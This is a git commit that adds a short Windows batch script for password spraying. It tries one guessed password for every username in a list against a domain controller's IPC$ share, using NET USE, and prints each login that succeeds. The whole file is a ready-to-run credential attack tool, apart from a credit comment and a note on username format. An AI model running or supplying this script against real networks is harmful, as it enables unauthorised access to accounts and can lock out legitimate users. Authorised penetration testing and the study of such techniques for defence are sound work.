fab840eacad17cb7fc3279aa286ff21ec90f482f
Mark Eldridge <8285554+meldridge@users.noreply.github.com>
2018-06-05 13:00:47 +0200

    Added Windows batch file for password spraying

---
+++ paswordspray.bat
@@ -0,0 +1,10 @@
+REM Credit to Joff Thyer: "Hunting Persistent Threats"
+REM Note: if usernames are in UPN format, use /USER:%%U without the DOMAIN\ prefix
+@echo off
+SET "DC=DC.DOMAIN.COM"
+SET "PASS=Summer2018"
+
+FOR /F %%U IN (users.txt) DO (
+  NET USE \\%DC%\IPC$ /USER:DOMAIN\%%U %PASS% 1>NUL 2>&1 && echo [*] %%U:%PASS% success && @NET USE /DELETE \\%DC%\IPC$ >NUL
+)
+
